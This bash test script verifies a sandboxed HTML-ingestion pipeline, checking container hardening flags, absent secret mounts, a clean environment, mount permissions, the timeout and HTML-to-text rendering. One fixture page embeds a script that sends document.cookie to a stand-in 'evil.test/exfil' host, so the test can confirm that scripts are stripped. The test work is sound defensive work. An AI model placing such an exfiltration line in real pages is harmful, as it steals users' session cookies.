#!/usr/bin/env bash
# kd-ingest.test.sh (WP-18, E5) — the leak-proof-sandbox proof, IN-BOX. Two parts:
#   A. CONTRACT (engine-free, KD_INGEST_DRYRUN): kd-ingest EMITS the exact containment argv — stage 2
#      has --network=none, dropped caps, read-only rootfs, /in ro + /out only, resource+time bound,
#      and NO vault/home/secret mount; stage 1 has egress (NO --network=none) but the same hardening.
#   B. REALITY (dev engine): the process stage is an ordinary --network=none container (NOT a
#      nested-nested run), so the dev engine proves the flags DO what the contract claims — no network,
#      vault/secrets ENOENT, host env not leaked, /in read-only, /out writable, one-shot (--rm), the
#      timeout bound fires, AND the parser actually renders HTML->text offline.
# The Part-B containment probe REUSES Part-A's emitted argv (swapping only the trailing command), so
# it exercises EXACTLY the flags production runs — zero drift between contract and reality.
# DEFERRED to host-gate (V27): per-user OCI-archive load ([ADJ-17]); pasta-fixture end-to-end fetch;
# whether --memory/--pids-limit enforce under the NESTED engine or re-scope to timeout(1).
set -uo pipefail
cd "$(dirname "$0")/../.."
ING="$PWD/shared/kd-ingest"
IMG="localhost/disposable/kd-ingest-sandbox:val-$$"
WORK="$(mktemp -d "${TMPDIR:-/tmp}/kd-ingest-test.XXXXXX")"
trap 'podman rmi -f "$IMG" >/dev/null 2>&1 || true; rm -rf "$WORK"' EXIT
fail(){ echo "KD-INGEST FAIL: $*"; exit 1; }
has(){ printf '%s\n' "${ARGV[@]}" | grep -qxF -- "$1" || fail "argv missing token: $1"; }
hasnot(){ printf '%s\n' "${ARGV[@]}" | grep -qxF -- "$1" && fail "argv MUST NOT carry: $1"; return 0; }

echo "== A. contract — stage 2 (process) is fully contained =="
mapfile -t ARGV < <(KD_INGEST_DRYRUN=1 KD_INGEST_IMAGE="$IMG" "$ING" process "$WORK" "$WORK")
has --network=none
has --cap-drop=ALL
has --security-opt=no-new-privileges
has --read-only
has --rm
has --userns=keep-id
printf '%s\n' "${ARGV[@]}" | grep -qxF -- "--memory=256m" || fail "no memory bound"
printf '%s\n' "${ARGV[@]}" | grep -qxF -- "--pids-limit=128" || fail "no pids bound"
printf '%s\n' "${ARGV[@]}" | grep -qxF "$WORK:/in:ro" || fail "no read-only /in mount"
printf '%s\n' "${ARGV[@]}" | grep -qxF "$WORK:/out" || fail "no /out mount"
printf '%s\n' "${ARGV[@]}" | grep -qF "timeout" || fail "no timeout wrapper"
# the CRUX of E5: the ONLY binds are /in + /out — no vault, no home, no secret is ever mounted in
badmounts="$(printf '%s\n' "${ARGV[@]}" | grep -E ':(/vault|/home|/run/secrets|/var/lib/kd)' || true)"
[ -z "$badmounts" ] || fail "a forbidden mount leaked into the process stage: $badmounts"
echo "  OK network=none, caps dropped, read-only, bounds, /in ro + /out only, no vault/home/secret mount"

echo "== A. contract — stage 1 (fetch) has egress but the same hardening, no /in =="
mapfile -t ARGV < <(KD_INGEST_DRYRUN=1 KD_INGEST_IMAGE="$IMG" "$ING" fetch "https://example.test/x" "$WORK")
hasnot --network=none         # fetch's whole job is egress
has --cap-drop=ALL
has --read-only
has --rm
printf '%s\n' "${ARGV[@]}" | grep -qxF "$WORK:/out" || fail "fetch has no /out"
printf '%s\n' "${ARGV[@]}" | grep -qF ":/in:ro" && fail "fetch must not mount /in (it hasn't fetched yet)"
badmounts="$(printf '%s\n' "${ARGV[@]}" | grep -E ':(/vault|/home|/run/secrets|/var/lib/kd)' || true)"
[ -z "$badmounts" ] || fail "a forbidden mount leaked into the fetch stage: $badmounts"
echo "  OK fetch: egress on, hardened, /out only, no vault/home/secret, no /in"

echo "== fail-closed: kd-ingest refuses to run a stage when the sandbox image is not loaded =="
mkdir -p "$WORK/in" "$WORK/out"
KD_INGEST_IMAGE="localhost/kd-ingest-absent:none" "$ING" process "$WORK/in" "$WORK/out" 2>/dev/null \
    && fail "ran a stage with NO sandbox image (must fail-closed — ensure_image)"
echo "  OK dies clearly when the sandbox image is absent ([ADJ-17] provision-load contract)"

echo "== build the sandbox image (provenance-pinned Fedora) =="
podman build --isolation=chroot -q -t "$IMG" -f shared/ingest-sandbox/Containerfile shared/ingest-sandbox/ \
    >/dev/null || fail "sandbox image build"

# The dev box's nested engine CANNOT create an isolated network namespace (crun writes
# net.ipv4.ping_group_range into the new netns and this box's /proc/sys/net is read-only) — so the
# --network=none RUNTIME severance is host-gate (V27), exactly as WP-16 defers its nested run. To
# prove the REST of the containment (mounts, env, fs, one-shot, timeout, the parser), we run the
# sandbox in the one mode this engine boots — --network=host --pid=host (the established in-box
# combo) — reusing the EXACT production process-stage flags from the dry-run and swapping ONLY the
# un-runnable netns token. Every property proven below is independent of the netns; the netns
# severance + private-pid isolation + resource-bound enforcement + the per-user OCI load ride V27.
mkdir -p "$WORK/in" "$WORK/out"
mapfile -t PARGV < <(KD_INGEST_DRYRUN=1 KD_INGEST_IMAGE="$IMG" "$ING" process "$WORK/in" "$WORK/out")
PREFIX=()
for tok in "${PARGV[@]}"; do
    if [ "$tok" = "--network=none" ]; then PREFIX+=(--network=host --pid=host)   # dev-engine netns swap
    else PREFIX+=("$tok"); fi
    [ "$tok" = "$IMG" ] && break
done
run_sandbox(){ "${PREFIX[@]}" "$@"; }        # production containment flags; only the netns is swapped
probe(){ run_sandbox /bin/sh -c "$1"; }

echo "== B. reality — the process stage actually renders HTML->text offline =="
cat > "$WORK/in/page.html" <<'HTML'
<html><head><title>t</title><style>.x{color:red}</style>
<script>fetch('https://evil.test/exfil?c='+document.cookie)</script></head>
<body><h1>Hello&nbsp;Wiki</h1><p>Body &amp; text.</p></body></html>
HTML
run_sandbox timeout 60 /usr/local/bin/kd-ingest-process /in /out >/dev/null || fail "process stage run"
out="$WORK/out/page.html.txt"
[ -f "$out" ] || fail "no rendered output produced"
grep -qF "Hello Wiki" "$out" || fail "extracted text missing (got: $(tr '\n' ' ' < "$out"))"
grep -qF "Body & text." "$out" || fail "entity unescape / body text missing"
grep -qiF "evil.test" "$out" && fail "script content leaked into the rendering (should be dropped)"
grep -qiF "color:red" "$out" && fail "style content leaked into the rendering (should be dropped)"
echo "  OK HTML rendered to plain text; script/style stripped; entities unescaped"

echo "== B. reality — containment probes (EXACT production flags, netns swapped for the dev engine) =="

echo "   - vault / secrets / roster are NOT mounted (nothing sensitive present)"
probe 'test ! -e /run/secrets/kd-roster && test ! -e /var/lib/kd && test ! -e /vault' || fail "a sensitive path is present in the sandbox"
probe '[ -z "$(ls -A /home 2>/dev/null)" ]' || fail "/home is not empty in the sandbox (a user home leaked)"

echo "   - the host environment is NOT leaked in"
KD_INGEST_SECRET_SENTINEL=THE-SENTINEL-MUST-NOT-APPEAR \
    run_sandbox /bin/sh -c 'env' | grep -q THE-SENTINEL-MUST-NOT-APPEAR \
    && fail "a host env var leaked into the sandbox"
echo "     OK env clean"

echo "   - /in is read-only, /out is writable"
probe 'touch /in/should-fail 2>/dev/null' && fail "/in was writable (must be read-only)"
probe 'touch /out/probe-ok'               || fail "/out was not writable"
[ -f "$WORK/out/probe-ok" ] || fail "the /out write did not land on the host bind"
rm -f "$WORK/out/probe-ok"

echo "   - the timeout bound fires (a runaway stage is killed)"
run_sandbox timeout 1 sleep 5; rc=$?
[ "$rc" = 124 ] || fail "timeout did not fire (rc=$rc, want 124)"

echo "   - one-shot: --rm leaves no container behind"
probe 'true'
leftovers="$(podman ps -a --filter ancestor="$IMG" --format '{{.ID}}' 2>/dev/null | wc -l | tr -d ' ')"
[ "$leftovers" = 0 ] || fail "$leftovers container(s) survived (--rm not honored)"

echo
echo "NOTE (host-gate V27, DESIGN §E5): the --network=none RUNTIME severance, private-pid isolation,"
echo "     --memory/--pids-limit enforcement under the NESTED engine, and the per-user OCI-archive load"
echo "     ride the host gate — the dev engine cannot create an isolated netns (crun ping_group_range)."
echo "KD-INGEST: GREEN (contract emits full containment; mounts/env/fs/one-shot/timeout + HTML->text proven in-box; netns severance = host-gate V27)"
